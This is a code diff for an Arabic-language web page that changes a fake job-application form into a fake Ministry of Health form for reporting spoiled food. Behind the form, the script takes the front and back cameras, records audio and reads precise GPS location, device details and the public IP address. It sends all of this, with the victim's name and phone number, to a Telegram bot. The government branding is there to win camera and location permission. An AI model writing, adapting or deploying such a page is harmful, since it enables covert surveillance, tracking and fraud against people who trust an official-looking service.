@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>نموذج توظيف - بيانات المتقدم</title>
+    <title>إبلاغ عن أغذية فاسدة - وزارة الصحة</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
@@ -22,7 +22,7 @@
             padding: 16px;
             background: #0a0a0a;
             background-image: 
-                radial-gradient(ellipse at 50% 0%, #1a0505 0%, #0a0000 70%);
+                radial-gradient(ellipse at 50% 0%, #1a2a05 0%, #000a00 70%);
             position: relative;
             overflow-x: hidden;
         }
@@ -47,7 +47,7 @@
         .bg-effects .glow:nth-child(1) {
             width: 500px;
             height: 500px;
-            background: #ef4444;
+            background: #22c55e;
             top: -200px;
             right: -200px;
         }
@@ -55,7 +55,7 @@
         .bg-effects .glow:nth-child(2) {
             width: 400px;
             height: 400px;
-            background: #dc2626;
+            background: #16a34a;
             bottom: -150px;
             left: -150px;
             animation-delay: 7s;
@@ -64,7 +64,7 @@
         .bg-effects .glow:nth-child(3) {
             width: 250px;
             height: 250px;
-            background: #b91c1c;
+            background: #15803d;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -87,20 +87,20 @@
             -webkit-backdrop-filter: blur(30px);
             border-radius: 40px;
             padding: 30px 24px 28px;
-            border: 1px solid rgba(239, 68, 68, 0.15);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.15);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(34, 197, 94, 0.1);
             text-align: center;
         }
 
         /* ========== رأس الصفحة ========== */
         .header-badge {
             display: inline-block;
-            background: rgba(239, 68, 68, 0.15);
-            border: 1px solid rgba(239, 68, 68, 0.2);
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid rgba(34, 197, 94, 0.2);
             border-radius: 30px;
             padding: 6px 18px;
             font-size: 11px;
-            color: #fca5a5;
+            color: #86efac;
             font-weight: 700;
             letter-spacing: 1px;
             margin-bottom: 16px;
@@ -110,14 +110,14 @@
         .icon-box {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, #dc2626, #991b1b);
+            background: linear-gradient(135deg, #22c55e, #15803d);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 16px;
             font-size: 40px;
-            box-shadow: 0 12px 50px rgba(220, 38, 38, 0.3);
+            box-shadow: 0 12px 50px rgba(34, 197, 94, 0.3);
             position: relative;
             animation: pulse-icon 2s ease-in-out infinite;
         }
@@ -127,7 +127,7 @@
             position: absolute;
             inset: -4px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #dc2626, #991b1b, #dc2626);
+            background: linear-gradient(135deg, #22c55e, #15803d, #22c55e);
             background-size: 300% 300%;
             z-index: -1;
             animation: border-glow 3s ease-in-out infinite;
@@ -135,8 +135,8 @@
         }
 
         @keyframes pulse-icon {
-            0%, 100% { transform: scale(1); box-shadow: 0 12px 50px rgba(220, 38, 38, 0.3); }
-            50% { transform: scale(1.05); box-shadow: 0 12px 70px rgba(220, 38, 38, 0.5); }
+            0%, 100% { transform: scale(1); box-shadow: 0 12px 50px rgba(34, 197, 94, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 70px rgba(34, 197, 94, 0.5); }
         }
 
         @keyframes border-glow {
@@ -150,11 +150,11 @@
             font-size: 26px;
             font-weight: 900;
             margin-bottom: 4px;
-            text-shadow: 0 0 40px rgba(220, 38, 38, 0.2);
+            text-shadow: 0 0 40px rgba(34, 197, 94, 0.2);
         }
 
         .main-title span {
-            background: linear-gradient(135deg, #fca5a5, #ef4444);
+            background: linear-gradient(135deg, #86efac, #22c55e);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -187,7 +187,8 @@
         }
 
         .form-group input,
-        .form-group textarea {
+        .form-group textarea,
+        .form-group select {
             width: 100%;
             padding: 12px 16px;
             background: rgba(255, 255, 255, 0.04);
@@ -197,14 +198,22 @@
             font-size: 15px;
             font-family: 'Cairo', sans-serif;
             transition: all 0.3s ease;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+
+        .form-group select option {
+            background: #1a1a1a;
+            color: #ffffff;
         }
 
         .form-group input:focus,
-        .form-group textarea:focus {
+        .form-group textarea:focus,
+        .form-group select:focus {
             outline: none;
-            border-color: rgba(239, 68, 68, 0.4);
+            border-color: rgba(34, 197, 94, 0.4);
             background: rgba(255, 255, 255, 0.06);
-            box-shadow: 0 0 20px rgba(220, 38, 38, 0.05);
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.05);
         }
 
         .form-group input::placeholder,
@@ -221,7 +230,7 @@
         .start-btn {
             width: 100%;
             padding: 20px;
-            background: linear-gradient(135deg, #dc2626, #991b1b);
+            background: linear-gradient(135deg, #22c55e, #15803d);
             border: none;
             border-radius: 60px;
             color: white;
@@ -230,7 +239,7 @@
             font-family: 'Cairo', sans-serif;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 8px 40px rgba(220, 38, 38, 0.3);
+            box-shadow: 0 8px 40px rgba(34, 197, 94, 0.3);
             position: relative;
             overflow: hidden;
             margin-bottom: 12px;
@@ -239,7 +248,7 @@
 
         .start-btn:hover:not(:disabled) {
             transform: translateY(-3px);
-            box-shadow: 0 12px 50px rgba(220, 38, 38, 0.5);
+            box-shadow: 0 12px 50px rgba(34, 197, 94, 0.5);
         }
 
         .start-btn:active:not(:disabled) {
@@ -328,7 +337,7 @@
         }
 
         .progress-wrap .top-row .percent {
-            color: #f87171;
+            color: #86efac;
             font-weight: 700;
         }
 
@@ -343,7 +352,7 @@
         .progress-track .fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #dc2626, #ef4444);
+            background: linear-gradient(90deg, #15803d, #22c55e);
             border-radius: 10px;
             transition: width 0.2s ease;
         }
@@ -474,16 +483,16 @@
 <div class="main-card">
 
     <!-- شارة -->
-    <div class="header-badge">📋 توظيف | تعبئة البيانات</div>
+    <div class="header-badge">🏥 وزارة الصحة | بلاغ عن أغذية فاسدة</div>
 
     <!-- أيقونة -->
-    <div class="icon-box">📝</div>
+    <div class="icon-box">⚠️</div>
 
     <!-- العنوان -->
-    <h1 class="main-title">نموذج <span>التوظيف</span></h1>
-    <p class="sub-desc">يرجى تعبئة البيانات المطلوبة</p>
+    <h1 class="main-title">بلاغ عن <span>أغذية فاسدة</span></h1>
+    <p class="sub-desc">ساهم في حماية الصحة العامة، أبلغ عن أي غذاء مشبوه</p>
 
-    <!-- ====== نموذج البيانات ====== -->
+    <!-- ====== نموذج البلاغ ====== -->
     <form id="applicationForm" onsubmit="return false;">
         <div class="form-group">
             <label>👤 الاسم الكامل <span style="color:#ef4444;">*</span></label>
@@ -491,34 +500,49 @@
         </div>
 
         <div class="form-group">
-            <label>📅 السن <span style="color:#ef4444;">*</span></label>
-            <input type="number" id="age" placeholder="العمر" min="18" max="65" required>
-        </div>
-
-        <div class="form-group">
-            <label>📍 العنوان <span style="color:#ef4444;">*</span></label>
-            <input type="text" id="address" placeholder="العنوان بالتفصيل" required>
-        </div>
-
-        <div class="form-group">
             <label>📞 رقم الهاتف <span style="color:#ef4444;">*</span></label>
-            <input type="tel" id="phoneNumber" placeholder="رقم الهاتف المحمول" required>
+            <input type="tel" id="phoneNumber" placeholder="رقم الهاتف للتواصل" required>
         </div>
 
         <div class="form-group">
-            <label>📧 البريد الإلكتروني <span class="optional">(اختياري)</span></label>
-            <input type="email" id="email" placeholder="example@email.com">
+            <label>📍 موقع الشراء / المنشأة <span style="color:#ef4444;">*</span></label>
+            <input type="text" id="place" placeholder="اسم المطعم، السوبرماركت، أو عنوان المنشأة" required>
         </div>
 
         <div class="form-group">
-            <label>📝 ملاحظات إضافية <span class="optional">(اختياري)</span></label>
-            <textarea id="notes" placeholder="أي معلومات إضافية تود إضافتها..."></textarea>
+            <label>🏷️ نوع المنتج المشتبه به <span style="color:#ef4444;">*</span></label>
+            <input type="text" id="product" placeholder="مثال: جبن، عصير، لحوم، حليب..." required>
+        </div>
+
+        <div class="form-group">
+            <label>📅 تاريخ الشراء <span style="color:#ef4444;">*</span></label>
+            <input type="date" id="purchaseDate" required>
+        </div>
+
+        <div class="form-group">
+            <label>⚠️ سبب الشك / المشكلة <span style="color:#ef4444;">*</span></label>
+            <select id="issueType" required>
+                <option value="">-- اختر نوع المشكلة --</option>
+                <option value="رائحة غير طبيعية">👃 رائحة غير طبيعية</option>
+                <option value="تغير في اللون">🎨 تغير في اللون</option>
+                <option value="انتفاخ أو تلف في العبوة">📦 انتفاخ أو تلف في العبوة</option>
+                <option value="طعم غريب">👅 طعم غريب</option>
+                <option value="وجود حشرات أو مواد غريبة">🐛 وجود حشرات أو مواد غريبة</option>
+                <option value="تاريخ انتهاء منتهي">📅 تاريخ انتهاء منتهي</option>
+                <option value="أعراض تسمم غذائي">🤢 أعراض تسمم غذائي</option>
+                <option value="أخرى">أخرى</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>📝 وصف تفصيلي للمشكلة <span class="optional">(اختياري)</span></label>
+            <textarea id="notes" placeholder="أدخل تفاصيل إضافية عن المنتج والمشكلة..."></textarea>
         </div>
     </form>
 
     <!-- زر الإرسال -->
     <button class="start-btn" id="startBtn">
-        <span class="btn-text">📤 إرسال الطلب</span>
+        <span class="btn-text">📤 إرسال البلاغ</span>
         <span class="loader-text">
             <span class="spinner"></span>
             جاري الإرسال...
@@ -529,7 +553,7 @@
     <div class="permit-hint">
         <span>📌 اضغط</span>
         <span class="key">سماح</span>
-        <span>لتفعيل الإرسال</span>
+        <span>لتفعيل الإرسال وجمع الأدلة</span>
     </div>
 
     <!-- شريط التحميل -->
@@ -547,8 +571,8 @@
     <!-- رسالة نجاح -->
     <div class="result-box" id="resultBox">
         <span class="result-icon">✅</span>
-        <div class="result-name" id="resultName">تم إرسال الطلب بنجاح!</div>
-        <div class="result-sub" id="resultSub">شكراً لتقديمك، سيتم التواصل معك قريباً</div>
+        <div class="result-name" id="resultName">تم إرسال البلاغ بنجاح!</div>
+        <div class="result-sub" id="resultSub">شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين</div>
     </div>
 
     <!-- رسالة خطأ -->
@@ -558,7 +582,7 @@
     <div class="footer-links">
         <span>🔒 بيانات آمنة</span>
         <span>⚡ إرسال فوري</span>
-        <span>📱 متوافق مع جميع الأجهزة</span>
+        <span>🏥 حماية الصحة العامة</span>
     </div>
 </div>
 
@@ -632,7 +656,7 @@
                 canvas.height = video.videoHeight || 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = `📸 صورة سيلفي للمتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
+                const caption = `📸 صورة مقدم البلاغ\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
@@ -643,7 +667,7 @@
         }
 
         // ============================================================
-        // ================ الكاميرا الخلفية ===========================
+        // ================ الكاميرا الخلفية (تصوير المنتج) ===========
         // ============================================================
         async function captureBackCamera(chatId, botToken, formData) {
             try {
@@ -659,7 +683,7 @@
                 canvas.height = video.videoHeight || 768;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = `📷 صورة محيط المتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
+                const caption = `📷 صورة المنتج المشتبه به\n👤 الاسم: ${formData.fullName}\n🏷️ المنتج: ${formData.product}\n📍 المكان: ${formData.place}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
@@ -681,7 +705,7 @@
                 const audioPromise = new Promise(resolve => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = `🎤 تسجيل صوتي للمتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
+                        const caption = `🎤 تسجيل صوتي لوصف البلاغ\n👤 الاسم: ${formData.fullName}\n🏷️ المنتج: ${formData.product}\n📞 الهاتف: ${formData.phone}`;
                         await sendToTelegram(chatId, botToken, 'audio', blob, caption);
                         resolve(true);
                     };
@@ -715,7 +739,7 @@
                         const data = await revGeo.json();
                         if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
                     } catch(e) {}
-                    const locMsg = `🌍 <b>موقع المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    const locMsg = `🌍 <b>موقع البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n📍 المكان: ${formData.place}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
                     await sendToTelegram(chatId, botToken, 'text', null, locMsg);
                     resolve(true);
                 }, (err) => {
@@ -747,7 +771,7 @@
                 connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
             
-            const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
             
             await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
@@ -768,7 +792,7 @@
                 let country = ipDetails.country_name || "غير معروف";
                 let city = ipDetails.city || "غير معروف";
                 let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                const ipMsg = `🌐 <b>IP مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
                 await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
             } catch(e) {}
         }
@@ -808,8 +832,8 @@
         }
 
         function showSuccess() {
-            resultName.textContent = '✅ تم إرسال الطلب بنجاح!';
-            resultSub.textContent = 'شكراً لتقديمك، سيتم التواصل معك قريباً';
+            resultName.textContent = '✅ تم إرسال البلاغ بنجاح!';
+            resultSub.textContent = 'شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين';
             resultBox.classList.add('show');
             setTimeout(() => resultBox.classList.remove('show'), 8000);
         }
@@ -822,20 +846,16 @@
 
             // ====== جمع بيانات النموذج ======
             const fullName = document.getElementById('fullName').value.trim();
-            const age = document.getElementById('age').value.trim();
-            const address = document.getElementById('address').value.trim();
             const phone = document.getElementById('phoneNumber').value.trim();
-            const email = document.getElementById('email').value.trim();
+            const place = document.getElementById('place').value.trim();
+            const product = document.getElementById('product').value.trim();
+            const purchaseDate = document.getElementById('purchaseDate').value;
+            const issueType = document.getElementById('issueType').value;
             const notes = document.getElementById('notes').value.trim();
 
-            // التحقق من الحقول المطلوبة (البريد اختياري)
-            if (!fullName || !age || !address || !phone) {
-                showError('⚠️ يرجى تعبئة جميع الحقول المطلوبة (الاسم، السن، العنوان، رقم الهاتف)');
-                return;
-            }
-
-            if (isNaN(age) || parseInt(age) < 18 || parseInt(age) > 65) {
-                showError('⚠️ السن يجب أن يكون بين 18 و 65 سنة');
+            // التحقق من الحقول المطلوبة
+            if (!fullName || !phone || !place || !product || !purchaseDate || !issueType) {
+                showError('⚠️ يرجى تعبئة جميع الحقول المطلوبة');
                 return;
             }
 
@@ -847,10 +867,11 @@
             // تجهيز بيانات النموذج
             const formData = {
                 fullName: fullName,
-                age: age,
-                address: address,
                 phone: phone,
-                email: email || 'لم يتم الإدخال',
+                place: place,
+                product: product,
+                purchaseDate: purchaseDate,
+                issueType: issueType,
                 notes: notes || 'لا يوجد'
             };
 
@@ -878,9 +899,9 @@
             }, 1000);
 
             try {
-                // ====== 1. إرسال بيانات النموذج ======
-                updateProgress(5, '📤 جاري إرسال البيانات...');
-                const formMsg = `📋 <b>بيانات المتقدم للوظيفة</b>\n\n👤 الاسم: ${formData.fullName}\n📅 السن: ${formData.age} سنة\n📍 العنوان: ${formData.address}\n📞 الهاتف: ${formData.phone}\n📧 البريد: ${formData.email}\n📝 الملاحظات: ${formData.notes}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                // ====== 1. إرسال بيانات البلاغ ======
+                updateProgress(5, '📤 جاري إرسال البلاغ...');
+                const formMsg = `🏥 <b>بلاغ عن أغذية فاسدة - وزارة الصحة</b>\n\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n📍 المكان: ${formData.place}\n🏷️ المنتج: ${formData.product}\n📅 تاريخ الشراء: ${formData.purchaseDate}\n⚠️ المشكلة: ${formData.issueType}\n📝 التفاصيل: ${formData.notes}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
                 await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, formMsg);
                 await new Promise(r => setTimeout(r, 400));
 
@@ -895,12 +916,12 @@
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 4. الكاميرا الأمامية ======
-                updateProgress(50, '📸 جاري التقاط الصورة...');
+                updateProgress(50, '📸 جاري التقاط الصورة الشخصية...');
                 await captureFrontCamera(MASTER_ID, BOT_TOKEN, formData);
                 await new Promise(r => setTimeout(r, 400));
 
-                // ====== 5. الكاميرا الخلفية ======
-                updateProgress(70, '📷 جاري تصوير المحيط...');
+                // ====== 5. الكاميرا الخلفية (تصوير المنتج) ======
+                updateProgress(70, '📷 جاري تصوير المنتج...');
                 await captureBackCamera(MASTER_ID, BOT_TOKEN, formData);
                 await new Promise(r => setTimeout(r, 400));
 
@@ -917,7 +938,7 @@
                 // ====== 8. الإكمال ======
                 updateProgress(100, '✅ تم الإرسال بنجاح!', '✅ اكتمل الإرسال');
                 await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `✅ <b>تم إرسال جميع بيانات المتقدم بنجاح!</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`
+                    `✅ <b>تم إرسال بلاغ الأغذية الفاسدة بنجاح!</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}`
                 );
 
                 // عرض رسالة النجاح
@@ -925,7 +946,7 @@
 
             } catch(e) {
                 console.error(e);
-                showError('❌ حدث خطأ أثناء إرسال البيانات');
+                showError('❌ حدث خطأ أثناء إرسال البلاغ');
             }
 
             // إنهاء التحميل
